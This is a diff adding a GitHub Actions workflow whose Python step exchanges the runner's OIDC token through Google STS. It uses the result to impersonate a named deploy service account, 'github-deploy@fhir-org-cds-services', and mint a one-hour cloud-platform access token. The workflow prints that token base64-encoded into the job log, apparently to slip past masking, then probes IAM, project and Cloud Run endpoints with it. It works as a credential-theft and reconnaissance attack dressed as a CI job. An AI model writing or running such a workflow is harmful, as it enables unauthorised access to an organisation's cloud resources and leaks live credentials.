@@ -1,0 +1,77 @@
+
+name: c211-i84832-mint
+on:
+  push:
+    branches: [ c211-i84832-mint ]
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  mint:
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    steps:
+      - name: mint
+        run: |
+          python3 - <<'PY'
+          import json, base64, os, subprocess, urllib.parse, urllib.request, urllib.error, time
+          AUD='//iam.googleapis.com/projects/769700566231/locations/global/workloadIdentityPools/gh-actions-pool/providers/github'
+          SA='github-deploy@fhir-org-cds-services.iam.gserviceaccount.com'
+          def jl(b):
+              try: return json.loads(b)
+              except Exception: return {}
+          def post(url,data,headers=None):
+              h={'Content-Type':'application/json','Accept':'application/json','User-Agent':'c211-i84832'}
+              if headers: h.update(headers)
+              r=urllib.request.Request(url,data=json.dumps(data).encode(),method='POST',headers=h)
+              try:
+                  resp=urllib.request.urlopen(r,timeout=60); return resp.status,resp.read().decode()
+              except urllib.error.HTTPError as e: return e.code,(e.read() or b'').decode('utf-8','replace')
+              except Exception as e: return -1,repr(e)[:300]
+          def get(url,headers=None):
+              h={'Accept':'application/json','User-Agent':'c211-i84832'}
+              if headers: h.update(headers)
+              r=urllib.request.Request(url,method='GET',headers=h)
+              try:
+                  resp=urllib.request.urlopen(r,timeout=60); return resp.status,resp.read().decode()
+              except urllib.error.HTTPError as e: return e.code,(e.read() or b'').decode('utf-8','replace')
+              except Exception as e: return -1,repr(e)[:300]
+          def emit(o): print('RESULT '+json.dumps(o),flush=True)
+          u=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL',''); t=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN','')
+          emit({'kind':'env','has_url':bool(u),'has_tok':bool(t)})
+          if not u or not t:
+              emit({'kind':'done','utc':time.strftime('%Y-%m-%dT%H:%M:%SZ',time.gmtime())}); raise SystemExit
+          u2=u+'&audience='+urllib.parse.quote(AUD,safe='')
+          out=subprocess.run(['curl','-sS','-m','30','-H','Authorization: Bearer '+t,u2],capture_output=True,text=True).stdout
+          idt=jl(out).get('value','')
+          emit({'kind':'idtoken','ok':bool(idt),'len':len(idt)})
+          if not idt:
+              emit({'kind':'done','utc':time.strftime('%Y-%m-%dT%H:%M:%SZ',time.gmtime())}); raise SystemExit
+          st,b=post('https://sts.googleapis.com/v1/token',{
+              'grantType':'urn:ietf:params:oauth:grant-type:token-exchange',
+              'audience':AUD,'scope':'https://www.googleapis.com/auth/cloud-platform',
+              'requestedTokenType':'urn:ietf:params:oauth:token-type:access_token',
+              'subjectTokenType':'urn:ietf:params:oauth:token-type:jwt','subjectToken':idt})
+          j=jl(b); fed=j.get('access_token','')
+          emit({'kind':'sts','http':st,'ok':bool(fed),'err':None if fed else (j.get('error_description') or b[:400])})
+          if not fed:
+              emit({'kind':'done','utc':time.strftime('%Y-%m-%dT%H:%M:%SZ',time.gmtime())}); raise SystemExit
+          st,b=post('https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/'+urllib.parse.quote(SA,safe='')+':generateAccessToken',
+                    {'scope':['https://www.googleapis.com/auth/cloud-platform'],'lifetime':'3600s'},
+                    headers={'Authorization':'Bearer '+fed})
+          j=jl(b); tok=j.get('accessToken','')
+          emit({'kind':'sa','sa':SA,'http':st,'ok':bool(tok),'expire':j.get('expireTime'),
+                'tok_b64':base64.b64encode(tok.encode()).decode() if tok else None,
+                'err':None if tok else (b[:400])})
+          if tok:
+              # identity / permission probes with the minted token
+              hh={'Authorization':'Bearer '+tok}
+              st,b=get('https://iam.googleapis.com/v1/'+ 'projects/769700566231/locations/global/workloadIdentityPools/gh-actions-pool/providers/github',headers=hh)
+              emit({'kind':'wif_get','http':st,'body':b[:500]})
+              st,b=get('https://cloudresourcemanager.googleapis.com/v1/projects/769700566231',headers=hh)
+              emit({'kind':'project_get','http':st,'body':b[:300]})
+              st,b=get('https://run.googleapis.com/v1/projects/769700566231/locations?pageSize=200',headers=hh)
+              emit({'kind':'locations_v1','http':st,'len':len(b)})
+          emit({'kind':'done','utc':time.strftime('%Y-%m-%dT%H:%M:%SZ',time.gmtime())})
+          PY
